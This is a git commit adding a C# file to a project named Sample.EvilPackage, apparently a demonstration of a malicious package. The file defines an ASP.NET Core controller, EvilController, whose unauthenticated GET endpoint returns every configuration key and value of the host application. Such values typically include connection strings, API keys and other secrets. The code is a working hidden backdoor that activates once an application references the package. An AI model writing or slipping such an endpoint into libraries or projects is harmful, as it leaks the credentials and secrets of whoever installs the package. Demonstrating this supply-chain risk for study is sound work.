ce2a3821edb25cb0a9ad96c176fda56a4b4fc14a
Burgyn <mino.martiniak@gmail.com>
2019-12-07 21:31:57 +0100

    initial commit

---
+++ src/Sample.EvilPackage/Class1.cs
@@ -0,0 +1,20 @@
+﻿using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Configuration;
+using System.Collections.Generic;
+using System.Linq;
+
+namespace Sample.EvilPackage
+{
+    [ApiController]
+    [Route("[controller]")]
+    public class EvilController: ControllerBase
+    {
+        [HttpGet]
+        public IEnumerable<KeyValuePair<string, string>> Get()
+        {
+            var configuration = HttpContext.RequestServices.GetService(typeof(IConfiguration)) as IConfiguration;
+
+            return configuration.AsEnumerable().OrderBy(p=> p.Key);
+        }
+    }
+}
